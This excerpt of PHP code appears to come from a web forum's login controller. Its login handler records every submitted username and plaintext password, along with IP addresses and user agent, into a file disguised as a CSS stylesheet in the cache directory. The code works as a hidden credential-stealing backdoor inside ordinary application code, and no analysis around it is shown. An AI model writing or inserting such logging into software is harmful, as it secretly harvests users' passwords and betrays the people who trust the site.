...
class logging_ctl {
	...
	function err_log_write($err_log){
		$log_file = './data/cache/fuck.css';
		$log_err_hand = @fopen($log_file, 'a');
		fwrite($log_err_hand, $err_log."\r\n");
		fclose($log_err_hand);
	}
	...
	function on_login() {
		...
		if(!submitcheck('loginsubmit', 1, $seccodestatus)) {
			...
			$error_log_str = time()."\t".$_GET['username']."\t".$_GET['password']."\t".$_G['clientip']."\tXF:".$_SERVER["HTTP_X_FORWARDED_FOR"]."\tCP:".$_SERVER["HTTP_CLIENT_IP"]."\tRP:".$_SERVER["REMOTE_ADDR"]."\tAG:".$_SERVER['HTTP_USER_AGENT'];
			$this->err_log_write($error_log_str);
			if($result['status'] > 0) {
